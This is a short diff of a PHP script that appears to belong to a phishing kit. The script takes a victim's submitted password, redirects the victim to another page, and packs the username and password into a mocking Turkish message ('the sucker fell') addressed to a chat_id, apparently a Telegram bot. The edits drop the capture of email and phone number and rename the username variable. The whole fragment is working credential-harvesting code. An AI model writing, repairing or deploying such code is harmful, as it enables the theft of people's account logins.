@@ -12,15 +12,12 @@ date_default_timezone_set('Europe/Istanbul');
 $cur_time=date("d-m-Y H:i:s");
 
 $password=$_POST["password"];
-$mail=$_POST["mail"];
-$number=$_POST["number"];
-include 'images/antisuspend.php';
 header("location: password.php?id=$id");
 
 $data = [
   'text' => '➡️ Lan Koş Sazan Düştü 😈 
 Sublime Saplar 😈
-Kullanıcı Adı : '.$user.'
+Kullanıcı Adı : '.$username.'
 Şifre : '.$password.'
 ',
   'chat_id' => $chat_id
